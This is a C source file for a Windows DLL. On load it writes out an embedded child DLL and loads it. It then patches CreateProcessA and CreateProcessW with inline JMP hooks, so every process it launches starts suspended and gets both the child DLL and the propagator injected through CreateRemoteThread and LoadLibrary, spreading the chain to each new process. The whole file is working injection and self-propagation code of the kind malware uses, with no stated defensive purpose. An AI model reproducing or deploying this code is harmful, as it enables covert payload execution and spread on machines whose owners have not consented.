#include <windows.h>
#include <stdio.h>
#include <shlwapi.h> // For PathRemoveFileSpecA/W and PathAppendA/W
#include "dll_name.h"
#include "dll_include.h"
#include "../../common/shared.h"

#pragma pack(push, 1)
struct JMP_REL32 {
    BYTE Opcode; // E9
    DWORD Offset;
};
#pragma pack(pop)

#define HOOK_SIZE sizeof(struct JMP_REL32)

// Struct to hold hook information
struct HOOK_INFO {
    LPVOID pTarget;
    LPVOID pDetour;
    BYTE OriginalBytes[HOOK_SIZE];
};

// Function prototypes
BOOL InstallHook(struct HOOK_INFO *pHook, LPVOID pTarget, LPVOID pDetour);
BOOL UninstallHook(struct HOOK_INFO *pHook);
void InjectDll(HANDLE hProcess, const char* dllPath);
void InjectDllW(HANDLE hProcess, const wchar_t* dllPath);

// Detour function prototypes
BOOL WINAPI DetourCreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
BOOL WINAPI DetourCreateProcessW(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

// Hook information for our targets
struct HOOK_INFO g_CreateProcessAHook;
struct HOOK_INFO g_CreateProcessWHook;

BOOL InstallHook(struct HOOK_INFO *pHook, LPVOID pTarget, LPVOID pDetour) {
    pHook->pTarget = pTarget;
    pHook->pDetour = pDetour;

    DWORD oldProtect;
    if (!VirtualProtect(pTarget, HOOK_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Save original bytes
    memcpy(pHook->OriginalBytes, pTarget, HOOK_SIZE);

    // Write the JMP instruction
    struct JMP_REL32 jmp;
    jmp.Opcode = 0xE9; // JMP rel32
    jmp.Offset = (DWORD)((LPBYTE)pDetour - ((LPBYTE)pTarget + HOOK_SIZE));

    memcpy(pTarget, &jmp, HOOK_SIZE);

    VirtualProtect(pTarget, HOOK_SIZE, oldProtect, &oldProtect);
    return TRUE;
}

BOOL UninstallHook(struct HOOK_INFO *pHook) {
    DWORD oldProtect;
    if (!VirtualProtect(pHook->pTarget, HOOK_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Restore original bytes
    memcpy(pHook->pTarget, pHook->OriginalBytes, HOOK_SIZE);

    VirtualProtect(pHook->pTarget, HOOK_SIZE, oldProtect, &oldProtect);
    return TRUE;
}

void InjectDll(HANDLE hProcess, const char* dllPath) {
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (remoteMem) {
        WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMem, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    }
}

void InjectDllW(HANDLE hProcess, const wchar_t* dllPath) {
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    if (remoteMem) {
        WriteProcessMemory(hProcess, remoteMem, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, remoteMem, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    }
}

BOOL WINAPI DetourCreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
) {
    // This unhook-call-rehook pattern is NOT thread-safe.
    UninstallHook(&g_CreateProcessAHook);

    dwCreationFlags |= CREATE_SUSPENDED;
    BOOL result = CreateProcessA(
        lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
        bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
        lpStartupInfo, lpProcessInformation
    );

    if (result) {
        char propagatorPath[MAX_PATH];
        char childDllPath[MAX_PATH];
        HMODULE hModule;

        if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)DetourCreateProcessA, &hModule)) {
            GetModuleFileNameA(hModule, propagatorPath, sizeof(propagatorPath));
            
            strcpy(childDllPath, propagatorPath);
            PathRemoveFileSpecA(childDllPath);
            PathAppendA(childDllPath, PROPAGATED_DLL_NAME);

            // Inject the child DLL first, then the propagator to continue the chain.
            InjectDll(lpProcessInformation->hProcess, childDllPath);
            InjectDll(lpProcessInformation->hProcess, propagatorPath);
        }
        ResumeThread(lpProcessInformation->hThread);
    }

    InstallHook(&g_CreateProcessAHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA"), DetourCreateProcessA);
    return result;
}

BOOL WINAPI DetourCreateProcessW(
    LPCWSTR               lpApplicationName,
    LPWSTR                lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCWSTR               lpCurrentDirectory,
    LPSTARTUPINFOW        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
) {
    // This unhook-call-rehook pattern is NOT thread-safe.
    UninstallHook(&g_CreateProcessWHook);

    dwCreationFlags |= CREATE_SUSPENDED;
    BOOL result = CreateProcessW(
        lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
        bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory,
        lpStartupInfo, lpProcessInformation
    );

    if (result) {
        wchar_t propagatorPath[MAX_PATH];
        wchar_t childDllPath[MAX_PATH];
        HMODULE hModule;

        if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)DetourCreateProcessW, &hModule)) {
            GetModuleFileNameW(hModule, propagatorPath, sizeof(propagatorPath) / sizeof(wchar_t));
            
            wcscpy(childDllPath, propagatorPath);
            PathRemoveFileSpecW(childDllPath);
            PathAppendW(childDllPath, PROPAGATED_DLL_NAME_W);

            // Inject the child DLL first, then the propagator to continue the chain.
            InjectDllW(lpProcessInformation->hProcess, childDllPath);
            InjectDllW(lpProcessInformation->hProcess, propagatorPath);
        }
        ResumeThread(lpProcessInformation->hThread);
    }

    InstallHook(&g_CreateProcessWHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessW"), DetourCreateProcessW);
    return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            {
                char selfPath[MAX_PATH];
                char targetPath[MAX_PATH];

                HMODULE hModule;
                if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)DllMain, &hModule)) {
                    GetModuleFileNameA(hModule, selfPath, sizeof(selfPath));
                    PathRemoveFileSpecA(selfPath);
                    
                    sprintf(targetPath, "%s\\%s", selfPath, PROPAGATED_DLL_NAME);
                }

                // Check if the file already exists (from a previous run)
                if (GetFileAttributesA(targetPath) == INVALID_FILE_ATTRIBUTES) {
                    write_resource_to_file(targetPath, CHILD_START, CHILD_END);
                }

                // Load the extracted DLL into the current process
                LoadLibraryA(targetPath);
            }
            // Install hooks for child processes
            InstallHook(&g_CreateProcessAHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA"), DetourCreateProcessA);
            InstallHook(&g_CreateProcessWHook, GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessW"), DetourCreateProcessW);
            break;
        case DLL_PROCESS_DETACH:
            UninstallHook(&g_CreateProcessAHook);
            UninstallHook(&g_CreateProcessWHook);
            break;
    }
    return TRUE;
}
